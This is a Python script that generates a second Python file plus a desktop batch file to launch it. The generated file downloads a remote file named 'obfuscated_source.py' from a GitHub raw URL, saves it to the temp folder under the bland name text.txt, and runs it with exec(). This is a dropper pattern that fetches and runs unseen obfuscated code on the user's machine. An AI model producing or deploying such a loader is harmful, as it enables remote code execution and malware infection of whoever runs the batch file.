import os

def create_python_file(directory, filename):
    content = '''
import os
import requests

import tempfile

temp_dir = tempfile.gettempdir()
file_path = os.path.join(temp_dir, 'text.txt')


def download_text_from_url(url, file_path):
    try:
        # Send a GET request to the URL
        response = requests.get(url)

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            # Create the directory if it doesn't exist
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # Open the file in write mode and write the content
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(response.text)
            
            print(f"Text downloaded successfully and saved to {file_path}")
        else:
            print(f"Failed to download text. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")



url = "https://raw.githubusercontent.com/turbotriggerbot/turbo-source-release/main/obfuscated_source.py"

temp_dir = tempfile.gettempdir()

file_path = os.path.join(temp_dir, 'text.txt')

download_text_from_url(url, file_path)

exec(open(file_path).read())
'''

    file_path = os.path.join(directory, filename)
    with open(file_path, 'w') as file:
        file.write(content)
    return file_path

def create_batch_file(directory, python_file):
    batch_content = f'cd "{directory}"\npython "{python_file}"'
    batch_file_path = os.path.join(os.path.expanduser("~"), "Desktop", "run_script.bat")
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(batch_content)
    return batch_file_path

def main():
    # Directory to save the Python file
    save_directory = input("Enter the directory to save the Python file:\n")
    
    # Python file name
    python_file_name = input("Enter the Python file name (with .py extension):\n")

    # Create Python file
    python_file_path = create_python_file(save_directory, python_file_name)
    print(f"Python file saved at: {python_file_path}")

    # Create batch file on desktop
    batch_file_path = create_batch_file(save_directory, python_file_name)
    print(f"Batch file saved on desktop: {batch_file_path}")

if __name__ == "__main__":
    main()
